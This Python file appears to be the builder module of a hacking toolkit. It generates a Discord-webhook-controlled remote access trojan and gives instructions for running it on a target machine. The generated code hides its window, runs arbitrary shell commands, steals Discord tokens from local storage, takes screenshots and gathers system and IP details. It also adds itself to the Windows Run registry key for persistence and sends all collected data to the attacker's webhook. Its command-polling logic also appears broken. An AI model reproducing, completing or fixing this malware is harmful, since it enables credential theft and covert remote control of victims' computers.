#!/usr/bin/env python3
# Discord RAT Builder Module - Fixed

import os, sys, time, base64, random, string, platform, json, subprocess, re

def run():
    print("\n" + "="*60)
    print("DISCORD RAT BUILDER")
    print("="*60)
    
    print("[!] This creates a Remote Access Tool controlled via Discord webhook")
    print("[!] Commands: shell [cmd], tokens, sysinfo, screenshot, pc_info")
    print("[!] The RAT will send PC info when it starts")
    print("="*60)
    
    webhook = input("\nWebhook URL: ").strip()
    
    if not webhook.startswith('https://discord.com/api/webhooks/'):
        print("\n[!] Invalid webhook URL!")
        print("[!] Format: https://discord.com/api/webhooks/ID/TOKEN")
        input("\nPress Enter to continue...")
        return
    
    filename = input("Filename [discord_rat]: ").strip() or "discord_rat"
    
    print("\n[+] Building Discord RAT...")
    
    code = f'''#!/usr/bin/env python3
# Discord RAT - Controlled via Webhook

import requests, subprocess, os, time, sys, platform, glob, re, base64, json, threading, ctypes, socket, getpass

WEBHOOK = "{webhook}"
IS_WIN = platform.system() == "Windows"

def send(data):
    try:
        if len(data) > 1900:
            for i in range(0, len(data), 1900):
                requests.post(WEBHOOK, json={{'content': data[i:i+1900]}})
        else:
            requests.post(WEBHOOK, json={{'content': data}})
    except Exception as e:
        pass

def execute_cmd(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        if not output:
            output = "[+] Command executed successfully (no output)"
        return output[:4000]
    except subprocess.TimeoutExpired:
        return "[!] Command timed out"
    except Exception as e:
        return f"[!] Error: {{str(e)}}"

def get_pc_info():
    info = []
    info.append("=== SYSTEM INFORMATION ===")
    info.append(f"Computer Name: {{platform.node()}}")
    info.append(f"OS: {{platform.system()}} {{platform.release()}}")
    info.append(f"OS Version: {{platform.version()}}")
    info.append(f"Architecture: {{platform.machine()}}")
    info.append(f"User: {{os.getlogin()}}")
    info.append(f"CPU: {{os.cpu_count()}} cores")
    
    try:
        import psutil
        info.append(f"RAM: {{round(psutil.virtual_memory().total / 1024**3, 2)}} GB")
        info.append(f"RAM Used: {{round(psutil.virtual_memory().used / 1024**3, 2)}} GB")
        info.append(f"RAM Free: {{round(psutil.virtual_memory().free / 1024**3, 2)}} GB")
        info.append(f"RAM Usage: {{psutil.virtual_memory().percent}}%")
        info.append(f"Disk Total: {{round(psutil.disk_usage('/').total / 1024**3, 2)}} GB")
        info.append(f"Disk Used: {{round(psutil.disk_usage('/').used / 1024**3, 2)}} GB")
        info.append(f"Disk Free: {{round(psutil.disk_usage('/').free / 1024**3, 2)}} GB")
        info.append(f"Disk Usage: {{psutil.disk_usage('/').percent}}%")
    except:
        pass
    
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
        info.append(f"Public IP: {{ip}}")
    except:
        pass
    
    try:
        hostname = socket.gethostname()
        info.append(f"Local IP: {{socket.gethostbyname(hostname)}}")
    except:
        pass
    
    info.append(f"Python Version: {{sys.version}}")
    info.append(f"Working Directory: {{os.getcwd()}}")
    info.append("="*30)
    
    return "\\n".join(info)

def steal_tokens():
    tokens = []
    paths = []
    if IS_WIN:
        paths = glob.glob(os.path.expandvars("%APPDATA%\\\\discord\\\\Local Storage\\\\leveldb\\\\*.log"))
        paths += glob.glob(os.path.expandvars("%APPDATA%\\\\discordcanary\\\\Local Storage\\\\leveldb\\\\*.log"))
        paths += glob.glob(os.path.expandvars("%APPDATA%\\\\discordptb\\\\Local Storage\\\\leveldb\\\\*.log"))
    else:
        paths = glob.glob(os.path.expanduser("~/.config/discord/Local Storage/leveldb/*.log"))
        paths += glob.glob(os.path.expanduser("~/.config/discordcanary/Local Storage/leveldb/*.log"))
        paths += glob.glob(os.path.expanduser("~/.config/discordptb/Local Storage/leveldb/*.log"))
    
    for p in paths:
        if os.path.exists(p):
            try:
                with open(p, 'r', errors='ignore') as f:
                    for line in f:
                        matches = re.findall(r'[\\w-]{{24,}}\\.[\\w-]{{6,}}\\.[\\w-]{{27,}}', line)
                        tokens.extend(matches)
            except:
                pass
    
    return list(set(tokens))

def take_screenshot():
    try:
        import PIL.ImageGrab
        img = PIL.ImageGrab.grab()
        img_path = os.path.join(os.environ.get('TEMP', '/tmp'), 'screenshot.png')
        img.save(img_path)
        with open(img_path, 'rb') as f:
            return base64.b64encode(f.read()).decode()
    except:
        return "[!] Screenshot failed"

def persist_windows():
    if not IS_WIN:
        return
    try:
        import winreg
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(handle, "DiscordRAT", 0, winreg.REG_SZ, sys.executable + " " + __file__)
        winreg.CloseKey(handle)
    except:
        pass

def main():
    if IS_WIN:
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    # Send connection notification
    try:
        send("[+] RAT CONNECTED!")
        time.sleep(1)
        pc_info = get_pc_info()
        send(pc_info)
        send("[+] RAT ready. Type 'help' for commands")
    except Exception as e:
        send(f"[!] Startup error: {{str(e)}}")
    
    last_cmd = ""
    last_cmd_time = 0
    
    while True:
        try:
            # Check for commands - use GET to read webhook messages
            response = requests.get(WEBHOOK, timeout=5)
            
            if response.status_code == 200:
                # Get the latest message from the webhook
                try:
                    data = response.json()
                    # Webhook messages are stored in the response
                    # For discord webhooks, we need to check the content
                    if isinstance(data, list) and len(data) > 0:
                        # Get the latest message
                        latest = data[-1] if data else None
                        if latest and 'content' in latest:
                            cmd = latest['content'].strip()
                            # Process command if it's new
                            if cmd and cmd != last_cmd:
                                last_cmd = cmd
                                
                                if cmd.startswith('shell '):
                                    result = execute_cmd(cmd[6:])
                                    send(result)
                                    
                                elif cmd == 'tokens':
                                    tokens = steal_tokens()
                                    if tokens:
                                        send(f"Tokens found: {{len(tokens)}}\\n" + "\\n".join(tokens[:10]))
                                    else:
                                        send("[!] No tokens found")
                                        
                                elif cmd == 'sysinfo' or cmd == 'pc_info':
                                    info = get_pc_info()
                                    send(info)
                                    
                                elif cmd == 'screenshot':
                                    img = take_screenshot()
                                    if img and img != "[!] Screenshot failed":
                                        send("[+] Screenshot captured\\n" + img[:500] + "...")
                                    else:
                                        send("[!] Screenshot failed")
                                        
                                elif cmd == 'persist':
                                    persist_windows()
                                    send("[+] Persistence enabled")
                                    
                                elif cmd == 'connected':
                                    send("[+] RAT is connected and running")
                                    pc_info = get_pc_info()
                                    send(pc_info)
                                    
                                elif cmd == 'help':
                                    help_text = """=== DISCORD RAT COMMANDS ===
shell [cmd]  - Execute system command
tokens       - Steal Discord tokens
sysinfo      - Get system information
pc_info      - Get detailed PC information
screenshot   - Take screenshot
persist      - Enable persistence
connected    - Check if RAT is connected
help         - Show this help
exit         - Stop the RAT"""
                                    send(help_text)
                                    
                                elif cmd == 'exit':
                                    send("[!] RAT shutting down...")
                                    sys.exit(0)
                                    
                                else:
                                    send(f"[!] Unknown command: {{cmd}}\\nType 'help' for commands")
                except json.JSONDecodeError:
                    # If response is not JSON, try to parse as text
                    # Webhook responses can vary
                    pass
                except Exception as e:
                    pass
            
            time.sleep(5)
            
        except requests.exceptions.RequestException:
            time.sleep(5)
        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    main()
'''
    
    # Save the RAT
    out_dir = os.path.expanduser("~/Downloads/BlackTiger_Output")
    os.makedirs(out_dir, exist_ok=True)
    
    py_path = os.path.join(out_dir, filename + ".py")
    with open(py_path, 'w') as f:
        f.write(code)
    
    print(f"\n[+] RAT saved to: {py_path}")
    
    # Create a BAT file for easy execution
    bat_path = os.path.join(out_dir, filename + ".bat")
    with open(bat_path, 'w') as f:
        f.write(f'''@echo off
echo Starting Discord RAT...
python "{py_path}"
pause
''')
    
    print(f"[+] Batch file saved to: {bat_path}")
    
    print("\n" + "="*60)
    print("HOW TO USE")
    print("="*60)
    print("1. Run the RAT on the target machine:")
    print(f"   python {filename}.py")
    print("\n2. The RAT will send PC info on startup")
    print("\n3. Send commands via webhook:")
    print("   - Go to your Discord webhook URL")
    print("   - Type a command and send it")
    print("\n4. Available commands:")
    print("   shell [cmd]  - Execute system command")
    print("   tokens       - Steal Discord tokens")
    print("   sysinfo      - Get system information")
    print("   pc_info      - Get detailed PC information")
    print("   screenshot   - Take screenshot")
    print("   persist      - Enable persistence")
    print("   connected    - Check RAT status")
    print("   help         - Show help")
    print("   exit         - Stop the RAT")
    print("="*60)
    
    input("\nPress Enter to continue...")

if __name__ == "__main__":
    run()
